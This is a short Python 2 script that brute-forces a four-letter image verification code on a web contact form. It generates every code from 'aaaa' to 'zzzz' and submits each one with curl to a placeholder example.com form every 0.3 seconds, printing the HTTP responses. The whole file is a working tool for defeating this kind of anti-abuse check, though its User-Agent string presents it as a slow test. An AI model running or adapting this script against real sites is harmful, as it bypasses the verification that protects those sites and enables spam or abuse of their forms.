#! /usr/bin/python

# Author: Timothy Gan

# Description: Inefficiently create an array containing 4 lowercase alphabet characters from "aaaa" to "zzzz" and attempt a curl command every 0.3 seconds using each verification code.
# No actual output was needed when I created this, but I made the program print the verification code and a small part of the output so I knew it was still running and running correctly.

import time
import subprocess

allowed_characters = 'abcdefghijklmnopqrstuvwxyz'
characters_array = []
for current in xrange(4):
  a = [i for i in allowed_characters]
  for y in xrange(current):
    a = [x+i for i in allowed_characters for x in a]
    if len(a[0]) == 4:
      characters_array = characters_array + a

for verification_code in characters_array:
  #print verification_code
  curl = "curl https://www.example.com/index.html -H 'Content-Type: application/x-www-form-urlencoded' -i -d 'emailRecipient=example@yopmail.com&emailRecipientCc=example@yopmail.com&subjectTitle=arbitrary_title&domain=https%3A%2F%2Fwww.example.com&category=arbitrary_category=nice+guy&contactNo=12345678&email=example%40yopmail.com&comment=123456&imageVerificationCode=" + verification_code + "' -H 'User-Agent: test-small-scale-slow-verification-code-guessing'"
  curl_command = subprocess.Popen(curl, stdout=subprocess.PIPE, shell=True) #shell is dangerous if input is from user
  translate_command = subprocess.Popen(['tr', '\\n', ' '], stdin=curl_command.stdout, stdout=subprocess.PIPE)
  pattern_match_command = subprocess.Popen(['awk', '/HTTP\/1.1/ {print $2, $100, $120, $140}'], stdin=translate_command.stdout, stdout=subprocess.PIPE)
  output = pattern_match_command.communicate()[0]
  print "VERIFICATION_CODE: " + verification_code
  print output
  time.sleep(0.3)